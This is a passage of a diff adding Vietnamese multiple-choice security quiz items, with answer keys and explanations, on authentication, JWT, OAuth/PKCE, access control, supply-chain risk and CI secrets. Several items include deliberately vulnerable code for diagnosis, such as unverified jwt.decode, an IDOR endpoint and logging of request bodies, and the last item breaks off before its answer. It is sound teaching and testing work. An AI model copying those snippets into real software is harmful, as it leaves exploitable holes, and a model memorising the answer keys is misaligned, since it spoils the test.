+    "correctIndices": [
+      0
+    ],
+    "explanation": "AuthN xác minh danh tính, AuthZ xác định quyền truy cập tài nguyên.\n✓ \"AuthN trả lời ai, AuthZ trả lời được làm gì\" đúng định nghĩa: AuthN là đăng nhập, AuthZ là kiểm quyền với từng tài nguyên.\n✗ Phân chia theo web/mobile không liên quan tới khác biệt AuthN/AuthZ.\n✗ Cả session lẫn JWT đều có thể dùng cho AuthN; cookie/JWT không định nghĩa AuthN vs AuthZ.\n✗ Phương án đảo ngược: kiểm quyền từng tài nguyên là AuthZ, chứng minh danh tính là AuthN."
+  },
+  {
+    "id": "sec-q-054",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Vì sao đặt JWT đăng nhập vào localStorage thay vì cookie HttpOnly bị coi là lỗ hổng?",
+    "options": [
+      "localStorage đọc được bằng JavaScript nên một lỗ XSS bất kỳ là đánh cắp được token",
+      "localStorage chỉ lưu được tối đa 72 byte",
+      "Trình duyệt không gửi localStorage qua HTTPS",
+      "localStorage tự động bị xoá sau mỗi request"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "localStorage truy cập được từ JS, nên XSS lấy được token; cookie HttpOnly thì JS không đọc nổi.\n✓ \"localStorage đọc được bằng JavaScript\" đúng: bất kỳ lỗ XSS nào cũng trích được token cho mọi user.\n✗ Giới hạn 72 byte là của bcrypt, không phải localStorage.\n✗ Việc gửi qua HTTPS là thuộc tính Secure của cookie, không liên quan localStorage.\n✗ localStorage tồn tại lâu dài, không tự xoá sau mỗi request."
+  },
+  {
+    "id": "sec-q-055",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Thuộc tính cookie nào giúp chống đánh cắp session_id qua XSS?",
+    "options": [
+      "HttpOnly",
+      "Secure",
+      "SameSite=Lax",
+      "Max-Age"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "HttpOnly khiến JavaScript không đọc được cookie, chặn việc XSS trích session.\n✓ \"HttpOnly\" đúng: JS không đọc được cookie nên XSS không lấy được session.\n✗ \"Secure\" chỉ bắt gửi qua HTTPS, chống nghe lén chứ không chống XSS.\n✗ \"SameSite=Lax\" chống CSRF, không chống XSS đọc cookie.\n✗ \"Max-Age\" chỉ định thời gian sống, không liên quan XSS."
+  },
+  {
+    "id": "sec-q-056",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Đoạn code Node.js sau có lỗ hổng gì?\n\nconst payload = jwt.decode(token);\nif (payload.sub) grantAccess(payload.sub);",
+    "options": [
+      "decode KHÔNG verify chữ ký nên ai cũng tự chế token và vào được",
+      "Thiếu kiểm tra HttpOnly trên cookie",
+      "Dùng RS256 thay vì HS256 gây chậm",
+      "payload.sub bị mã hoá nên không đọc được"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "jwt.decode chỉ giải mã, không kiểm chữ ký, nên token giả mạo vẫn được chấp nhận.\n✓ \"decode KHÔNG verify chữ ký\" đúng: phải dùng jwt.verify; decode cho phép bất kỳ ai chế payload tuỳ ý.\n✗ HttpOnly là cấu hình cookie, không liên quan tới việc verify JWT này.\n✗ Vấn đề không phải hiệu năng RS256/HS256 mà là thiếu verify hoàn toàn.\n✗ payload không bị mã hoá; phần payload của JWT chỉ là base64, đọc được."
+  },
+  {
+    "id": "sec-q-057",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Tấn công \"nhầm RS256 sang HS256\" thành công khi nào, và cách chặn đúng là gì?",
+    "options": [
+      "Khi code tự suy alg từ token và dùng public key làm HMAC secret; chặn bằng cách cố định whitelist algorithms",
+      "Khi access token sống quá ngắn; chặn bằng cách tăng thời gian sống",
+      "Khi thiếu thuộc tính SameSite; chặn bằng SameSite=Strict",
+      "Khi dùng cookie thay vì localStorage; chặn bằng chuyển sang localStorage"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Kẻ tấn công đổi header sang HS256 rồi ký HMAC bằng public key (ai cũng biết); nếu code tự suy alg, public key bị dùng làm secret nên chữ ký hợp lệ.\n✓ \"Code tự suy alg + cố định whitelist algorithms\" đúng: ép algorithms:[\"RS256\"] khiến token HS256 bị từ chối.\n✗ Thời gian sống token không liên quan tới việc nhầm thuật toán ký.\n✗ SameSite chống CSRF, không liên quan tới chọn thuật toán verify.\n✗ localStorage còn nguy hiểm hơn (XSS) và không liên quan tấn công này."
+  },
+  {
+    "id": "sec-q-058",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "multi",
+    "question": "Khi verify một JWT phía server, những điều nào sau đây là BẮT BUỘC làm đúng? (chọn nhiều)",
+    "options": [
+      "Dùng verify thay vì decode và whitelist algorithms cố định, cấm alg:none",
+      "Kiểm exp, iss và aud",
+      "Tin tưởng trường alg trong header của token",
+      "Chấp nhận mọi thuật toán để tương thích nhiều client",
+      "Để access token sống ngắn (5-15 phút) và revoke dựa vào refresh token"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      4
+    ],
+    "explanation": "Verify chữ ký, ép thuật toán, kiểm claim và giữ access token ngắn là các thực hành đúng.\n✓ \"verify + whitelist algorithms + cấm none\" đúng: chặn alg:none và nhầm thuật toán.\n✓ \"Kiểm exp/iss/aud\" đúng: đảm bảo token còn hạn, đúng nhà phát hành và cấp cho đúng API.\n✓ \"Access token sống ngắn, revoke qua refresh\" đúng theo checklist.\n✗ \"Tin alg trong header\" sai: đó chính là gốc của tấn công đổi thuật toán.\n✗ \"Chấp nhận mọi thuật toán\" sai: mở đường cho alg:none và HS256/RS256."
+  },
+  {
+    "id": "sec-q-059",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Bạn cần xây tính năng \"đăng nhập bằng Google\" và lấy danh tính user. Nên dùng chuẩn nào?",
+    "options": [
+      "OIDC (lớp authentication trên OAuth, có ID token chứa danh tính)",
+      "Chỉ OAuth 2.0 vì OAuth đã trả về danh tính user",
+      "SAML Implicit flow để token về qua URL cho nhanh",
+      "Tự viết flow đăng nhập riêng để kiểm soát hoàn toàn"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "OAuth là framework authorization, không nói user là ai; OIDC thêm ID token chứa danh tính.\n✓ \"OIDC có ID token\" đúng: khi cần đăng nhập-bằng-X phải dùng OIDC.\n✗ \"Chỉ OAuth\" sai: OAuth cấp quyền truy cập tài nguyên, không khẳng định danh tính.\n✗ Implicit flow trả token qua URL dễ rò rỉ và bị OAuth 2.1 loại bỏ.\n✗ Tự viết flow đăng nhập bằng tay là phản khuyến nghị của bài."
+  },
+  {
+    "id": "sec-q-060",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "PKCE bảo vệ chống tấn công nào, và cơ chế cốt lõi là gì?",
+    "options": [
+      "Chống chặn authorization code: kẻ chặn được code nhưng không có code_verifier nên không đổi được token",
+      "Chống XSS đọc cookie bằng cách thêm cờ HttpOnly",
+      "Chống SQL injection bằng cách tham số hoá truy vấn",
+      "Chống brute-force mật khẩu bằng rate limit"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "PKCE thêm code_verifier dùng-một-lần; server hash verifier so với challenge nên code bị chặn cũng vô dụng.\n✓ \"Chống chặn authorization code, kẻ chặn không có verifier\" đúng cơ chế PKCE.\n✗ HttpOnly chống XSS đọc cookie, không phải mục đích PKCE.\n✗ PKCE không liên quan tới SQL injection.\n✗ Rate limit chống brute-force, khác hoàn toàn PKCE."
+  },
+  {
+    "id": "sec-q-061",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Cơ chế refresh token rotation + reuse detection phát hiện token bị đánh cắp bằng cách nào?",
+    "options": [
+      "Nếu một refresh token cũ đã dùng lại xuất hiện thì có 2 bên giữ cùng token, server thu hồi toàn bộ token family",
+      "Mã hoá refresh token bằng AES nên không ai giải được",
+      "Đặt refresh token trong localStorage để theo dõi truy cập",
+      "So sánh IP của mọi request để chặn token lạ"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Mỗi lần refresh cấp token mới và vô hiệu cái cũ; thấy token cũ tái xuất nghĩa là bị lộ, server khoá cả family.\n✓ \"Token cũ đã dùng lại xuất hiện → thu hồi family\" đúng cơ chế reuse detection.\n✗ Mã hoá AES không phát hiện được việc token bị copy và dùng lại.\n✗ localStorage là nơi không nên đặt token, không phải cơ chế phát hiện.\n✗ So IP không phải cơ chế rotation; bài không dựa vào IP để phát hiện reuse."
+  },
+  {
+    "id": "sec-q-062",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Khi lưu mật khẩu user, lựa chọn nào đúng nhất theo khuyến nghị của bài?",
+    "options": [
+      "Argon2id (lựa chọn số 1, OWASP khuyến nghị) hoặc bcrypt",
+      "SHA-256 thường vì nhanh và có sẵn",
+      "MD5 kèm salt cố định cho mọi user",
+      "Lưu plaintext nhưng giới hạn quyền truy cập DB"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Hàm hash chuyên cho mật khẩu (chậm, tốn bộ nhớ, có salt) mới chống được crack GPU.\n✓ \"Argon2id hoặc bcrypt\" đúng: Argon2id là lựa chọn số 1, bcrypt vẫn rất ổn.\n✗ SHA-256 thường tính cực nhanh, GPU dò hàng tỉ hash/giây.\n✗ MD5 yếu và salt cố định càng tệ; phải salt riêng từng mật khẩu.\n✗ Lưu plaintext là lỗ hổng nghiêm trọng dù có giới hạn quyền."
+  },
+  {
+    "id": "sec-q-063",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Vì sao passkeys/WebAuthn chống phishing tận gốc còn TOTP và SMS OTP thì không?",
+    "options": [
+      "Chữ ký gắn chặt với origin (tên miền thật) và không có \"mã\" để user lỡ nhập vào trang giả",
+      "Passkey gửi mật khẩu qua kênh được mã hoá mạnh hơn",
+      "Passkey đổi mã mỗi 30 giây nhanh hơn TOTP",
+      "Passkey lưu private key trên server nên an toàn hơn"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "WebAuthn ký challenge gắn với origin; trang giả không lấy được chữ ký hợp lệ và không có mã để user nhập nhầm.\n✓ \"Chữ ký gắn với origin, không có mã để nhập nhầm\" đúng lý do chống phishing.\n✗ Passkey không gửi mật khẩu; nó dùng public-key crypto, không phải kênh mã hoá mạnh hơn.\n✗ Việc đổi mã 30 giây là TOTP và vẫn bị phish; không phải đặc tính passkey.\n✗ Private key nằm trên thiết bị (Secure Enclave/TPM), server chỉ giữ public key."
+  },
+  {
+    "id": "sec-q-064",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Endpoint sau bị lỗ hổng loại nào và sửa thế nào?\n\napp.get(\"/api/invoices/:id\", auth, async (req, res) => {\n  const inv = await db.invoice.findById(req.params.id);\n  res.json(inv);\n});",
+    "options": [
+      "BOLA/IDOR: phải ràng ownerId của user gọi vào truy vấn, trả 404 nếu không khớp",
+      "BFLA: thiếu kiểm role admin, thêm require_role(\"admin\")",
+      "alg:none: phải whitelist thuật toán JWT",
+      "CSRF: thêm SameSite=Strict cho cookie"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Code lấy hoá đơn theo ID mà không kiểm object có thuộc về user gọi không, nên user A đọc được hoá đơn user B.\n✓ \"BOLA/IDOR, ràng ownerId vào query, trả 404\" đúng cách sửa.\n✗ BFLA là lỗi thiếu kiểm quyền chức năng (vd endpoint admin), không phải tình huống đọc object của người khác này.\n✗ alg:none thuộc verify JWT, không liên quan kiểm ownership.\n✗ CSRF khác bản chất; lỗi ở đây là thiếu kiểm chủ sở hữu object."
+  },
+  {
+    "id": "sec-q-065",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Theo nguyên tắc phân quyền của bài, những phát biểu nào ĐÚNG? (chọn nhiều)",
+    "options": [
+      "Phải kiểm quyền ở server, cho từng tài nguyên cụ thể, ngay trước khi truy cập dữ liệu",
+      "Áp dụng deny by default: route không có guard quyền tường minh thì bị chặn",
+      "Ẩn nút trên UI là đủ để bảo vệ chức năng quản trị",
+      "Dùng UUID khó đoán đã thay thế hoàn toàn việc kiểm tra quyền",
+      "Với endpoint admin nên dùng require_role để chống BFLA"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      4
+    ],
+    "explanation": "Phân quyền phải ở server, theo từng object, deny by default, và chặn BFLA bằng kiểm role.\n✓ \"Kiểm ở server, theo từng tài nguyên, ngay trước khi truy cập\" đúng nguyên tắc cốt lõi.\n✓ \"Deny by default\" đúng: không có guard thì route bị chặn để \"quên middleware\" không thành lỗ hổng.\n✓ \"require_role chống BFLA\" đúng cho endpoint admin.\n✗ \"Ẩn nút UI là đủ\" sai: attacker gọi API trực tiếp bỏ qua UI.\n✗ \"UUID thay kiểm quyền\" sai: UUID chỉ là lớp phụ, không thay được kiểm tra quyền."
+  },
+  {
+    "id": "sec-q-066",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Một developer chạy `npm install` và vô tình cài package tên `lodahs` thay vì `lodash`. Đây là loại tấn công supply chain nào?",
+    "options": [
+      "Typosquatting",
+      "Dependency confusion",
+      "Protestware / sabotage",
+      "SSRF qua registry"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Tên gần giống package phổ biến, chờ developer gõ nhầm chính là typosquatting.\n✓ Publish package tên gần giống chờ gõ nhầm là đặc trưng của typosquatting.\n✗ Việc attacker publish bản version cao hơn cho package private trùng tên lên public registry là vector khác.\n✗ Tác giả tự phá hoại package chính mình là một vector khác.\n✗ Lừa server gửi request tới đích nội bộ không liên quan tới cài nhầm tên package."
+  },
+  {
+    "id": "sec-q-067",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Theo bài học, vì sao `postinstall`/`preinstall` script của một package độc hại lại đặc biệt nguy hiểm?",
+    "options": [
+      "Nó chạy code tùy ý với quyền của user, TRƯỚC khi bạn kịp review một dòng nào",
+      "Nó chỉ chạy sau khi bạn build production",
+      "Nó chỉ đọc được file trong thư mục node_modules",
+      "Nó cần quyền root mới chạy được"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Lifecycle script chạy ngay lúc cài, với mọi quyền của user, trước khi review.\n✓ Script chạy code tùy ý với quyền user và xảy ra trước khi review là điểm nguy hiểm cốt lõi.\n✗ Nó chạy ngay lúc install, không đợi tới lúc build production.\n✗ Nó đọc được SSH key, AWS creds, .npmrc token, không bị giới hạn trong node_modules.\n✗ Nó chạy với quyền của user đang cài, không cần root."
+  },
+  {
+    "id": "sec-q-068",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Công ty bạn có private package `@acme/utils`. Attacker publish `@acme/utils` lên public registry với version cao hơn, resolver mặc định kéo bản public về. Biện pháp phòng đúng là gì?",
+    "options": [
+      "Khóa scope @acme về registry nội bộ trong .npmrc",
+      "Tăng version private package lên cao hơn public",
+      "Chạy `npm install --ignore-scripts`",
+      "Chỉ chạy `npm audit --audit-level=high` mỗi lần build"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Đây là dependency confusion; khóa scope về registry nội bộ là cách phòng đúng.\n✓ Cấu hình @acme:registry trỏ về registry nội bộ buộc mọi package scope đó lấy từ nguồn nội bộ, không đi public.\n✗ Đua version với attacker không bền vì attacker luôn có thể tăng cao hơn.\n✗ Tắt lifecycle script chống malware lúc cài nhưng không ngăn resolver chọn nguồn public.\n✗ SCA chỉ thấy lỗ hổng đã biết, không chặn việc kéo nhầm package từ public."
+  },
+  {
+    "id": "sec-q-069",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Một engineer khẳng định: 'Đã chạy `npm audit` và `osv-scanner` trong CI thì coi như chặn được mọi rủi ro dependency.' Đánh giá nào đúng?",
+    "options": [
+      "Sai, vì SCA chỉ thấy lỗ hổng ĐÃ BIẾT, không phát hiện malware ngày 0 hay typosquat tên mới",
+      "Đúng, SCA quét cả CVE lẫn typosquat mới",
+      "Sai, vì SCA chỉ chạy được trên Go",
+      "Đúng, miễn là fail build khi có HIGH/CRITICAL"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "SCA đối chiếu database CVE/advisory nên chỉ thấy lỗ hổng đã biết.\n✓ SCA bỏ sót malware ngày 0 và typosquat tên mới, chỉ là một lớp chứ không phải toàn bộ phòng thủ.\n✗ SCA không phát hiện được typosquat tên mới chưa có advisory.\n✗ SCA là cross-ecosystem (npm, pip, Go...), không chỉ Go.\n✗ Fail build khi HIGH/CRITICAL vẫn không che được lỗ hổng chưa biết."
+  },
+  {
+    "id": "sec-q-070",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Sau Log4Shell, sếp hỏi 'image nào, version nào của ta đang dùng log4j?'. Artifact nào lưu sẵn sẽ trả lời được trong vài giây thay vì grep cả tổ chức?",
+    "options": [
+      "SBOM (bản kê thành phần, ví dụ CycloneDX/SPDX) lưu kèm mỗi release",
+      "File .trivyignore.yaml",
+      "Token OIDC của CI runner",
+      "Provenance attestation SLSA L1"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "SBOM là bản kê khai máy-đọc-được mọi thành phần, version, hash của artifact.\n✓ SBOM lưu kèm release cho phép query nhanh thành phần nào ở image/version nào.\n✗ File ignore chỉ dùng để quản trị tiếng ồn của scanner, không kê khai thành phần.\n✗ Token OIDC dùng để xác thực runner, không liệt kê dependency.\n✗ Provenance chứng minh build ở đâu/từ source nào, không phải danh sách đầy đủ thành phần để truy CVE."
+  },
+  {
+    "id": "sec-q-071",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Đoạn Dockerfile có dòng `FROM node:20`. Vì sao đây là rủi ro supply chain và sửa thế nào?",
+    "options": [
+      "Tag :20 di động có thể trỏ image khác sau mỗi push; pin theo digest immutable (`node:20.11.1-slim@sha256:...`)",
+      "Tag :20 quá cũ; đổi thành `node:latest`",
+      "Thiếu USER root; thêm `USER root`",
+      "Thiếu `npm install`; build sẽ luôn lỗi"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Tag mềm không bất biến nên cùng tag có thể ra image khác nhau, phá tính tái lập.\n✓ Pin theo digest sha256 đảm bảo luôn ra đúng một image bất biến.\n✗ Đổi sang :latest còn di động hơn, làm vấn đề tệ hơn.\n✗ Chạy bằng root là phản pattern bảo mật, nên dùng non-root.\n✗ Vấn đề là tính bất biến của image, không phải lệnh cài đặt."
+  },
+  {
+    "id": "sec-q-072",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Trong workflow GitHub Actions có dòng `uses: actions/checkout@v4`. Rủi ro cụ thể và cách phòng bất biến duy nhất là gì?",
+    "options": [
+      "Tag v4 di động, nếu account maintainer bị chiếm tag có thể trỏ sang commit độc; pin theo commit SHA đầy đủ",
+      "Tag v4 lộ secret ra log; thêm `--redact`",
+      "Action chạy chậm; cache lại bằng SBOM",
+      "Action mặc định permissions read nên cần đổi sang write-all"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Tag là con trỏ di động; chỉ pin theo commit SHA mới bất biến.\n✓ Nếu maintainer bị chiếm, tag v4 có thể bị trỏ lại commit độc chạy với quyền CI; pin SHA đầy đủ là cách bất biến duy nhất.\n✗ Việc redact dùng cho scanner secret, không liên quan tới tính bất biến của action.\n✗ SBOM dùng để truy thành phần, không khắc phục tag di động.\n✗ Đổi sang write-all vi phạm least privilege, làm rủi ro tăng."
+  },
+  {
+    "id": "sec-q-073",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Một secret `sk_live_...` đã lỡ bị commit và push lên repo từ tuần trước. Hành động ĐÚNG và ưu tiên đầu tiên là gì?",
+    "options": [
+      "Rotate (vô hiệu hóa) ngay secret đó, rồi mới dọn git history",
+      "Xóa file ở commit mới nhất là đủ vì secret đã biến mất",
+      "Thêm file vào .gitignore để không lộ nữa",
+      "Chạy `gitleaks` để chặn các commit tương lai, secret cũ tự an toàn"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Secret đã commit nằm trong history mãi mãi (mọi clone, fork, backup), nên đổi key thôi không đủ nhưng là việc bắt buộc đầu tiên.\n✓ Rotate ngay làm secret leak trở nên vô giá trị, sau đó mới dọn history.\n✗ Xóa file ở commit sau không cứu được vì secret vẫn còn trong các commit cũ.\n✗ .gitignore chỉ ngăn lần sau, không xóa secret đã có trong history.\n✗ Chặn commit tương lai không vô hiệu hóa secret đã bị lộ."
+  },
+  {
+    "id": "sec-q-074",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Theo nguyên tắc của bài, đặc tính nào khiến một secret bị leak trở nên 'gần như vô giá trị' với attacker?",
+    "options": [
+      "Short-lived: dynamic credential có TTL ngắn, hết hạn sau ~1 giờ",
+      "Được mã hóa base64 trước khi lưu vào env",
+      "Độ dài tối thiểu 32 ký tự",
+      "Được commit kèm comment cảnh báo"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Secret ngắn hạn hết hạn nhanh nên leak ra cũng gần như không dùng được.\n✓ Dynamic credential TTL ngắn (ví dụ Vault tạo user tạm 1h) làm leak gần như vô giá trị.\n✗ Base64 chỉ là encode, không phải bảo mật.\n✗ Độ dài lớn không cứu nếu credential sống nhiều tháng.\n✗ Comment cảnh báo không làm giảm giá trị của một secret còn hiệu lực bị lộ."
+  },
+  {
+    "id": "sec-q-075",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Workflow có `on: pull_request_target` và checkout code của PR từ fork chưa tin cậy. Vì sao đây là lỗ hổng nghiêm trọng?",
+    "options": [
+      "pull_request_target chạy với secret của repo gốc, nên code của attacker từ fork chạy VỚI secret của bạn",
+      "Nó làm CI chạy chậm hơn pull_request thường",
+      "Nó tự động cấp permissions read nên không deploy được",
+      "Nó chỉ chạy trên runner self-hosted nên an toàn"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "pull_request_target có quyền truy cập secret của repo gốc; checkout + chạy code fork đồng nghĩa thực thi code attacker với secret của bạn.\n✓ Code attacker từ fork chạy với secret của bạn là rủi ro cốt lõi nên không dùng pull_request_target để checkout fork.\n✗ Vấn đề là bảo mật, không phải tốc độ.\n✗ Nó vốn rộng quyền và truy cập secret, không giới hạn read.\n✗ Nó không tự an toàn dù chạy ở đâu; nguy hiểm nằm ở việc lộ secret cho code fork."
+  },
+  {
+    "id": "sec-q-076",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Khi cứng hóa một container image production theo checklist của bài, những biện pháp nào ĐÚNG? (chọn tất cả phù hợp)",
+    "options": [
+      "Dùng base minimal/distroless pin theo digest",
+      "Multi-stage để build tool và secret không lọt vào image cuối",
+      "Chạy `USER nonroot` thay vì root",
+      "Dùng `FROM ubuntu:latest` cho đầy đủ công cụ debug",
+      "Bỏ scan image trong CI để build nhanh hơn"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "Bài đề cao base nhỏ pin digest, multi-stage, non-root và scan trong CI.\n✓ Base minimal/distroless pin digest giảm CVE OS và đảm bảo bất biến.\n✓ Multi-stage giữ build tool và secret không lọt vào image cuối.\n✓ Chạy non-root giảm tác hại nếu bị chiếm.\n✗ ubuntu:latest là base béo nhiều CVE và tag di động, đúng phản pattern bài cảnh báo.\n✗ Bỏ scan image làm mất một lớp phòng thủ, trái checklist."
+  },
+  {
+    "id": "sec-q-077",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "multi",
+    "question": "Để có build tái lập được (reproducible) cho production, nên áp dụng những cách nào? (chọn tất cả phù hợp)",
+    "options": [
+      "Dùng `npm ci` với lockfile đã commit thay vì `npm install`",
+      "Pin base image theo digest sha256",
+      "Pin GitHub Action theo commit SHA",
+      "Dùng range `\"express\": \"^4.18.0\"` trong production",
+      "Để Docker base ở `FROM node:20` cho linh hoạt"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "Reproducibility là nền của SCA/SBOM; cần khóa chính xác mọi thứ.\n✓ npm ci cài đúng cây đã commit và fail nếu lệch, đúng cho CI.\n✓ Pin base image theo digest đảm bảo luôn ra đúng một image.\n✓ Pin action theo commit SHA chống tag di động.\n✗ Range ^ cho phép version trôi, thuộc cấp độ yếu không dùng cho production.\n✗ Tag node:20 mềm có thể trỏ image khác sau mỗi push, phá tính tái lập."
+  },
+  {
+    "id": "sec-q-078",
+    "courseId": "SECURITY",
+    "lesson": "sec-06-supply-chain",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Trong CI, để bỏ long-lived cloud access key lưu sẵn trên runner, cách bài học khuyến nghị là gì?",
+    "options": [
+      "Dùng OIDC federation để runner lấy short-lived credential theo identity",
+      "Hardcode access key vào biến môi trường của workflow",
+      "Commit key đã mã hóa base64 vào repo",
+      "Tăng độ dài access key lên gấp đôi"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "OIDC federation cấp credential ngắn hạn theo identity, không cần lưu static key.\n✓ Workload identity qua OIDC cho runner lấy short-lived STS credential, đúng nguyên tắc của bài.\n✗ Hardcode key vào workflow chính là long-lived secret cần loại bỏ.\n✗ Commit key (kể cả encode) vẫn để lộ secret vào history.\n✗ Độ dài key không giải quyết vấn đề long-lived static credential."
+  },
+  {
+    "id": "sec-q-079",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Kẻ tấn công dùng botnet 50.000 IP residential proxy để credential stuffing vào POST /login, mỗi IP chỉ thử vài lần. Hệ thống chỉ có rate limit theo IP. Vì sao cấu hình này không cứu được?",
+    "options": [
+      "Vì rate limit theo IP không kích hoạt khi mỗi IP chỉ gửi ít request, botnet phân tán vượt qua dễ dàng; cần thêm giới hạn theo account đích",
+      "Vì rate limit theo IP làm chậm cả người dùng hợp lệ nên phải tắt đi",
+      "Vì WAF rule-based đã chặn hết các request này rồi",
+      "Vì rate limit theo IP chỉ hoạt động với HTTPS chứ không với HTTP"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Botnet xoay hàng chục nghìn IP nên mỗi IP đều dưới ngưỡng, giới hạn theo IP không nổ.\n✓ Mỗi IP thử ít lần nên ngưỡng IP không kích hoạt; phải rate limit thêm theo username/account đích\n✗ Việc làm chậm người dùng hợp lệ không phải lý do thất bại trước botnet\n✗ Mỗi request login trông hợp lệ nên WAF signature không chặn được\n✗ Rate limit không phụ thuộc vào HTTP hay HTTPS"
+  },
+  {
+    "id": "sec-q-080",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Đoạn log sau có vấn đề gì nghiêm trọng?\nlogger.info(f\"User logged in: {request.json}\")",
+    "options": [
+      "Nó dump cả request body, có thể chứa mật khẩu/token, biến hệ thống log thành kho dữ liệu rò rỉ",
+      "Nó dùng f-string nên chậm hơn structured logging",
+      "Nó thiếu mức log ERROR cho sự kiện đăng nhập",
+      "Nó không có timestamp nên không điều tra được"
+    ],
+    "correctIndices": [
+      0
+    ],
